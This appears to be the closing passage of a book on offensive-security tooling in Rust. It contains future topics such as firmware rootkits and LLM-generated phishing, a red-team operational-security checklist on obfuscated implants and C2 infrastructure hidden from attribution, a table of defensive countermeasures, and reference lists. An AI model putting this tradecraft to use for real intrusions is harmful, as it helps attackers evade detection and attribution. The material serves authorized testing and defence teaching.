**Firmware and Embedded** — `no_std` Rust is production-ready for microcontrollers and routers. Offensive capabilities on embedded hardware represent an emerging frontier.

**Advanced Persistence** — UEFI/BIOS implants, bootkit development, firmware rootkits. Rust's `no_std` with `uefi` crate support is a growing area.

**Machine Learning for Offense** — using LLMs to generate contextually appropriate phishing content, automate target profiling, and adapt implant behavior to evade behavioral detection.

### 14.3 Operational Security Checklist

Before any authorized engagement:

- [ ] All tools compiled with `strip = true` and `lto = true`
- [ ] Debug symbols removed, build reproducibility disabled
- [ ] C2 infrastructure behind CDN/redirectors — no direct attribution
- [ ] Implant binary packed/obfuscated
- [ ] TLS certificate pinned in implant
- [ ] E2EE on all C2 traffic
- [ ] All infrastructure provisioned with clean operational identities
- [ ] VPN/Tor for all infrastructure management
- [ ] Written authorization (scope, rules of engagement) in hand
- [ ] Incident response plan agreed with client

### 14.4 The Defender's Perspective

Every technique in this book has a defensive corollary. Understanding how attacks work is the foundation of effective defense:

- Scanner traffic → network flow anomaly detection, port scan alerts
- Web crawlers → robots.txt honeypots, request rate limiting, bot fingerprinting
- Fuzzing → WAF rules, input validation, safe parsing libraries
- Shellcode → DEP/NX bits, stack canaries, ASLR, CFI
- Phishing → DMARC/DKIM/SPF, security awareness training, WASM content inspection
- RAT beacons → DNS/TLS traffic analysis, periodic connection anomalies, EDR behavioral rules
- Lateral movement → network segmentation, least-privilege, east-west traffic inspection

The best offensive tools make you a better defender. The best defenders understand offensive techniques deeply. This book exists at that intersection.

---

## Appendix A — Useful Crates Reference

| Crate | Purpose |
|---|---|
| `tokio` | Async runtime |
| `reqwest` | HTTP client |
| `scraper` | HTML parsing |
| `rayon` | Data parallelism |
| `serde` / `serde_json` | Serialization |
| `actix-web` | HTTP server |
| `sqlx` | Async SQL |
| `x25519-dalek` | ECDH key exchange |
| `chacha20poly1305` | AEAD encryption |
| `blake3` | Hashing / KDF |
| `wasm-bindgen` | WASM/JS interop |
| `web-sys` | Browser APIs from Rust |
| `winreg` | Windows registry |
| `if-addrs` | Network interface enumeration |
| `uuid` | UUID generation |
| `regex` | Regular expressions |
| `bytes` | Zero-copy byte buffers |

## Appendix B — Recommended Reading

- *The Rust Programming Language* — Klabnik & Nichols (language reference)
- *Programming Rust* — Blandy & Orendorff (deep Rust internals)
- *Hacking: The Art of Exploitation* — Erickson (low-level exploitation theory)
- *The Web Application Hacker's Handbook* — Stuttard & Pinto
- *Silence on the Wire* — Zalewski (passive network reconnaissance)
- *The Shellcoder's Handbook* — Koziol et al.

---

*This book is intended for authorized penetration testing, security research, and educational purposes only. All techniques should be used exclusively against systems for which you have explicit written authorization.*
